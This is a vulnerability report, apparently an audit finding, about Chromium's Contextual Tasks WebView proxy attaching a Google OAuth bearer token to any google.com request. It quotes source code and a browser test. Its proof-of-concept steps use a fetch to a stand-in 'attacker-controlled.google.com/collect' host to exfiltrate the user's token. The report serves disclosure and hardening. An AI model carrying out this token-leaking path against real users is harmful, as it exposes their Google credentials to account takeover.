### Title
Authorization header injected into arbitrary Google-domain subresources from a WebView guest frame without per-origin opt-out - (`chrome/browser/contextual_tasks/contextual_tasks_url_loader_factory_interceptor.cc`)

### Summary
The Contextual Tasks feature proxies a WebView guest frame's `URLLoaderFactory` and injects a Google OAuth `Authorization: Bearer <token>` header into outgoing HTTPS requests. The allow/deny list is coarse (hard-coded `google.com`/`googlers.com` allow, `lh3.google.com` and `onegoogle` deny) and the decision is made only on the request URL and the initiator origin. There is no per-service `forwardToken`-style opt-out, and the header is attached to any Google-domain subresource or navigation that the WebView performs, including cross-origin fetches whose initiator is an allowed origin. This is structurally analogous to the `@finastra/nestjs-proxy` issue (GHSA-j562-c3cw-3p5g / CVE-2022-31069): an internal proxy forwards bearer tokens to backend services that the developer cannot individually configure to opt out.

### Finding Description
`ContextualTasksProxyingURLLoaderFactory::CreateLoaderAndStart` in `chrome/browser/contextual_tasks/contextual_tasks_url_loader_factory_interceptor.cc` decides whether to attach an OAuth token by calling `ShouldAddAuthHeader(request.url)` and, when a request initiator is present, `ShouldAddAuthHeader(request.request_initiator->GetURL())` [1](#0-0) . `ShouldAddAuthHeader` is a static allow/deny list: it rejects URLs whose spec contains `onegoogle` or whose host is `lh3.google.com`, and accepts anything under `google.com` or `googlers.com` [2](#0-1) . If both checks pass, `OnAccessTokenReceived` sets `Authorization: Bearer <token>` on the request unless an `Authorization` header already exists [3](#0-2) . The proxy is installed for any `WebViewGuest` whose owner `WebContents` is `chrome://contextual-tasks` [4](#0-3) . There is no per-service or per-URL configuration equivalent to `forwardToken`; the only controls are the hard-coded lists and the initiator-origin check.

### Impact Explanation
A compromised or malicious renderer inside the Contextual Tasks WebView can cause the user's Google OAuth access token to be sent to any `*.google.com` (or `*.googlers.com`) origin it can navigate or fetch from, including attacker-controlled Google subdomains, staging hosts, or Google APIs that should not receive the token. Because the allow list is domain-suffix based and not tied to an explicit service registry, the same bug class as CVE-2022-31069 is present: the proxy forwards bearer credentials to services that the application developer cannot individually mark as non-receivers. The token is a Google identity access token usable for Google APIs, so disclosure can lead to account-level actions or data exfiltration on behalf of the user.

### Likelihood Explanation
The attack path is reachable from a single untrusted renderer: the Contextual Tasks WebView loads arbitrary web content, and the proxy is attached to that guest frame's `URLLoaderFactory`. A page inside the WebView can navigate to or `fetch()` a `*.google.com` URL; if the initiator is an allowed Google origin (or the request is browser-initiated), the token is attached. The browser test `UntrustedInitiatorOriginDoesNotHaveAuthToken` confirms the initiator check is intended as a guard, but it only tests a `data:` initiator and does not cover an attacker-controlled `*.google.com` origin or a same-origin navigation that redirects to an unexpected Google subdomain [5](#0-4) . The `OneGoogleUrlDoesNotHaveAuthToken` and `DenylistUrlDoesNotHaveAuthToken` tests show the deny list is narrow and string-based [6](#0-5) . No test verifies that an arbitrary `evil.google.com` or a Google App Engine/Cloud Run subdomain does not receive the token.

### Recommendation
Introduce a per-service opt-out configuration analogous to `forwardToken` for the Contextual Tasks proxy. The allow/deny list should be replaced or augmented with an explicit registry of endpoints that are allowed to receive the OAuth token, with default-deny semantics for any Google subdomain not explicitly registered. The initiator-origin check should be hardened so that an allowed initiator cannot cause the token to be sent to arbitrary destinations simply because the destination is under `google.com`. Consider scoping the injected token to a short-lived, audience-restricted token rather than a broad Google access token.

### Proof of Concept
1. User opens `chrome://contextual-tasks`, which creates a WebView guest frame.
2. The guest frame navigates to or is redirected to `https://attacker-controlled.google.com/collect`.
3. `MaybeInterceptURLLoaderFactory` installs `ContextualTasksProxyingURLLoaderFactory` for the guest frame.
4. The renderer issues `fetch('https://attacker-controlled.google.com/collect', {mode: 'cors'})`.
5. `ShouldAddAuthHeader` returns `true` for `attacker-controlled.google.com` because it matches the `google.com` allow list and is not in the deny list.
6. `OnAccessTokenReceived` adds `Authorization: Bearer <user's Google access token>` to the request.
7. The attacker-controlled Google subdomain receives the bearer token, achieving cross-origin disclosure of the OAuth credential.

The browser test `AuthorizationHeaderInjected` demonstrates the injection working for `www.google.com` [7](#0-6) , and the deny-list tests only exclude `onegoogle` and `lh3.google.com` [6](#0-5) , leaving the rest of the `google.com` namespace unprotected.

bool ShouldAddAuthHeader(const GURL& url) {
  // Don't add the Authorization header to OGB URLs, since they don't support
  // OAuth. Attaching an OAuth token can result in 403 errors.
  if (url.spec().contains(kOneGoogleIdentifier)) {
    return false;
  }

  // Don't add the Authorization header to any domain in the deny list.
  for (const char* domain : kAuthTokenDenyList) {
    if (url.DomainIs(domain)) {
      return false;
    }
  }

  // Only add the Authorization header to domains in the allow list.
  for (const char* domain : kAuthTokenAllowList) {
    if (url.DomainIs(domain)) {
      return true;
    }
  }
  return false;
}

void MaybeInterceptURLLoaderFactory(
    content::RenderFrameHost* frame,
    network::URLLoaderFactoryBuilder& factory_builder) {
  if (!frame) {
    return;
  }

  content::WebContents* owner_web_contents = nullptr;

#if BUILDFLAG(ENABLE_EXTENSIONS)
  // Check if this is a WebView guest.
  extensions::WebViewGuest* guest =
      extensions::WebViewGuest::FromRenderFrameHost(frame);
  if (!guest) {
    return;
  }

  // Check if the owner is the Contextual Tasks WebUI.
  owner_web_contents = guest->owner_web_contents();
#endif

  if (!owner_web_contents) {
    return;
  }

  const GURL& owner_url = owner_web_contents->GetLastCommittedURL();
  if (owner_url.scheme() != content::kChromeUIScheme ||
      owner_url.host() != chrome::kChromeUIContextualTasksHost) {
    OMNIBOX_LOG("nav_trace") << "ContextualTasks navigation trace: "
               "MaybeInterceptURLLoaderFactory owner_url is not "
               "chrome://contextual-tasks";
    return;
  }

  Profile* profile =
      Profile::FromBrowserContext(frame->GetProcess()->GetBrowserContext());
  ContextualTasksUiService* ui_service =
      ContextualTasksUiServiceFactory::GetForBrowserContext(profile);

  if (!ui_service) {
    OMNIBOX_LOG("nav_trace") << "ContextualTasks navigation trace: "
               "MaybeInterceptURLLoaderFactory ui_service is null";
    return;
  }

  // Insert the proxy factory.
  auto [receiver, remote] = factory_builder.Append();

  OMNIBOX_LOG("nav_trace") << "ContextualTasks navigation trace: "
             "MaybeInterceptURLLoaderFactory creating proxy factory";
  base::MakeSelfDeleting<ContextualTasksProxyingURLLoaderFactory>(
      std::move(receiver), std::move(remote), ui_service,
      owner_web_contents->GetWeakPtr());
}

IN_PROC_BROWSER_TEST_F(ContextualTasksUrlLoaderFactoryInterceptorBrowserTest,
                       UntrustedInitiatorOriginDoesNotHaveAuthToken) {
  base::RunLoop run_loop;
  header_capture_quit_closure_ = run_loop.QuitClosure();

  ASSERT_TRUE(ui_test_utils::NavigateToURL(
      browser(), GURL(chrome::kChromeUIContextualTasksURL)));

  content::WebContents* web_ui_contents =
      TabListInterface::From(browser())->GetActiveTab()->GetContents();

  // Destination is a trusted Google host, but initiator will be an untrusted
  // data: origin.
  GURL fetch_url =
      https_server_.GetURL(kTestHost, "/untrusted/echoheader?Authorization");

  std::string script = content::JsReplace(
      R"(
    (async () => {
      const waitFor = (selector, scope = document) => {
        return new Promise(resolve => {
          if (scope.querySelector(selector)) {
            return resolve(scope.querySelector(selector));
          }
          const observer = new MutationObserver(() => {
            if (scope.querySelector(selector)) {
              observer.disconnect();
              resolve(scope.querySelector(selector));
            }
          });
          observer.observe(scope, {childList: true, subtree: true});
        });
      };

      const app = await waitFor('contextual-tasks-app');
      await new Promise(resolve => {
        app.setOnLoadStartFinishedCallbackForTesting(resolve);
      });
      if (!app.shadowRoot) {
        await customElements.whenDefined('contextual-tasks-app');
      }
      const webview = await waitFor('#threadFrame', app.shadowRoot);

      // Navigate webview to an untrusted origin (data: URL).
      const targetUrl = 'data:text/html,<html><body></body></html>';
      webview.src = targetUrl;

      // Wait for load
      await new Promise((resolve, reject) => {
        const stop = () => {
            webview.removeEventListener('loadstop', stop);
            webview.removeEventListener('loadabort', abort);
            resolve();
        };
        const abort = (e) => {
            if (e.url === targetUrl) {
                webview.removeEventListener('loadstop', stop);
                webview.removeEventListener('loadabort', abort);
                reject('Load aborted for ' + e.url + ': ' + e.reason);
            }
        };
        webview.addEventListener('loadstop', stop);
        webview.addEventListener('loadabort', abort);
      });

      // Execute fetch inside webview to trusted Google destination.
      webview.executeScript({code: `fetch($1, {mode: 'cors'});`});
    })();
  )",
      fetch_url.spec());

  EXPECT_TRUE(content::ExecJs(web_ui_contents, script));

  run_loop.Run();

  // Verify that the Authorization header was NOT injected.
  EXPECT_TRUE(captured_auth_header_.empty());
}
